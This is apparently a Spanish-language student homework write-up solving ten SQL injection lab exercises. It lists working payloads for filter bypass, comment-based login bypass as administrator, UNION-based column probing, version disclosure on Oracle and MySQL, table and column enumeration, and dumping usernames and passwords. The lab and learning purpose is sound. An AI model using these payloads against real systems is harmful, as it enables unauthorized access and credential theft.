```sql
```
# Práctico 3 Base De Datos – Jose Ignacio Lavecchia

1- '+ OR 1 = 1 –  
También se podría hacer algo como esto:

SELECT * FROM products WHERE category = '' OR '1' = '1' AND released = 0; 

Suponiendo que released es un booleano en el que 0 es el valor de productos que no han sido liberados y 1 el de productos que ya han sido liberados.

2- Modificamos el parámetro de username con administrator '-- ya que así todo lo que siga en la consulta será ignorado por el -- de los comentarios.

3- La idea es realizar un ataque con el comando UNION, pero antes debemos asegurarnos de que el número de columnas en la consulta original coincide con el número de columnas de nuestra SQL Injection. Para esto, el comando UNION solo va a funcionar si el número y tipo de columnas coinciden.

Para esto, utilizamos un payload como este: 
'+UNION+SELECT+'abc','def'+FROM+dual--

Después procedemos a intentar obtener algún tipo de información de la base de datos, como por ejemplo la versión, para esto utilizamos el siguiente payload:

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

4- Primero determinamos el número de columnas que está devolviendo la query original y las columnas las cuales contienen la información, para ello utilizamos el siguiente payload:

'+UNION+SELECT+'abc','def'#

(# = Comentario)

Después utilizamos el siguiente payload para obtener la versión de la base de datos:

'+UNION+SELECT @@version,+NULL#

5- Primero determinamos el número de columnas que está devolviendo la query original y las columnas las cuales contienen la información, para ello utilizamos el siguiente payload:

'+UNION+SELECT+'abc','def'#

Procedemos a utilizar el siguiente payload para que nos devuelva las tablas en la base de datos:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name = 'users_abcdef'—

Después de encontrar las columnas que contienen los usernames y las passwords, utilizamos el siguiente payload para que nos devuelva los usuarios y contraseñas para todos los usuarios:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef—

Finalmente encontramos la contraseña para el usuario “administrator” y nos logueamos.

6- Primero determinamos el número de columnas que está devolviendo la query original y las columnas las cuales contienen la información, para ello utilizamos el siguiente payload:

'+UNION+SELECT+'abc','def'+FROM+dual—

Procedemos a utilizar el siguiente payload para obtener la información de la lista de tablas en la base de datos:

'+UNION+SELECT+table_name,+NULL+FROM+all_tables—

Después de encontrar la tabla que tiene las credenciales del usuario, procedemos a realizar el siguiente payload para recibir información de las columnas de la tabla:

'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'—

Procedemos a ejecutar el siguiente payload para recibir la información de los usuarios y sus contraseñas:

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF—

Por último, simplemente encontramos al usuario llamado 'administrator' y su contraseña y nos logueamos.

7- Para determinar el número de columnas devueltas por la query, simplemente ejecutamos el siguiente payload:

'+UNION+SELECT+NULL,NULL—

Continuamos añadiendo `NULL` hasta que la consulta compile correctamente.

8- Primero determinamos el número de columnas devueltas por la query, una vez que obtenemos la cantidad de consultas correctas, simplemente empezamos a reemplazar cada `NULL` por un string hasta que compile correctamente, obteniendo así la columna de tipo texto.

'+UNION+SELECT+NULL,NULL,NULL—

'+UNION+SELECT+'seraestalacolumnadetipotexto?',NULL,NULL—

9- Primero determinamos el número de columnas devueltas por la query y cuáles de ellas contienen datos:

'+UNION+SELECT+'abc','def'—

Después, obtenemos las credenciales de la tabla de usuarios:

'+UNION+SELECT+username,+password+FROM+users—

Buscamos el usuario llamado 'administrator' y nos logueamos.

10- Finalmente, determinamos el número de columnas devueltas por la query y utilizamos este payload para concatenar las credenciales en una sola columna, separadas por `~`:

'+UNION+SELECT+NULL,'abc'—

'+UNION+SELECT+username||'~'||password+FROM+users—
